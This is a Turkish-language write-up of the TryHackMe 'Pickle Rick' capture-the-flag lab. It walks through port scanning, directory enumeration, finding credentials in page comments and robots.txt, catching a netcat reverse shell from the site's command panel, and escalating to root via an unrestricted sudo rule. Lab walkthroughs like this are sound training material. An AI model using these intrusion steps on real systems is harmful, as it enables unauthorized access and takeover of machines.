---
title: 'TryHackMe | Pickle Rick WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [command execution, sudo]
render_with_liquid: false
---

Bu yazımda, TryHackMe platformunda yer alan "Pickle Rick" isimli meydan okumayı çözeceğiz. Öncelikle hedefi tanımak adına nmap ile bir port taraması yapalım. Daha sonra açık portlara ve üzerinde çalışan servislere göre yolumuzu çizmeye başlayabiliriz.

```console
$ nmap -sV -sC -T4 10.10.164.239
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 26:d5:4a:c3:63:84:c5:38:ed:e2:5c:91:76:91:55:5c (RSA)
|   256 d1:01:87:e1:31:38:f3:9b:0f:a1:25:32:53:3a:80:2b (ECDSA)
|_  256 15:eb:64:9f:c4:0f:28:90:09:05:84:cd:e8:9a:0d:a0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tarama sonucunda 22 (SSH) ve 80 (HTTP) numaralı portların açık olduğunu öğrendik. Çalışan servislerin sürümlerinden kaynaklanan herhangi bir zafiyet bulunmadığından doğrudan HTTP servisine yöneliyorum.

```html
  <!--
    Note to self, remember username!
    Username: ********
  -->
```

Ana sayfanın kaynak kodunda bir kullanıcı adı buldum. Kayıt ettikten sonra dirsearch ile bir dosya/dizin taraması yapmaya karar verdim.

```console
[08:53:12] 200 -  589B  - /assets/
[08:53:41] 200 -  455B  - /login.php
[08:54:02] 200 -   17B  - /robots.txt
```

Tarama sonucunda bir kullanıcı giriş sayfası olduğunu öğrendik. Daha önce bir kullanıcı adı bulmuştuk parolası ise robots.txt dosyasında bulunuyor.

Giriş yaptıktan sonra sistemde komutlar çalıştırabileceğimiz bir panel ile karşılaşıyoruz. netcat aracını kullanarak bir reverse shell alacağım.

```console
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.21.66.61] from (UNKNOWN) [10.10.164.239] 50094
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bağlantıyı elde ettikten sonra bulduğumuz dizinde ilk malzemeyi buluyoruz. Aslında bu görev pekte önemli değil, ben sadece yetki yükseltmek istiyorum. "sudo -l" komutunu kullandığımızda herhangi bir kullanıcının yetkisinde istediğimiz komutu çalıştırabileceğimizi görüyoruz.

```console
www-data@ip-10-10-164-239:/var/www/html$ sudo -l
Matching Defaults entries for www-data on ip-10-10-164-239:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-164-239:
    (ALL) NOPASSWD: ALL
```

root kullanıcısı olarak bash'e geçiş yapıyor, böylece yetki yükseltmiş oluyoruz.
```console
www-data@ip-10-10-164-239:/var/www/html$ sudo bash
root@ip-10-10-164-239:/var/www/html# cd /root
root@ip-10-10-164-239:~# ls
3rd.txt  snap
```
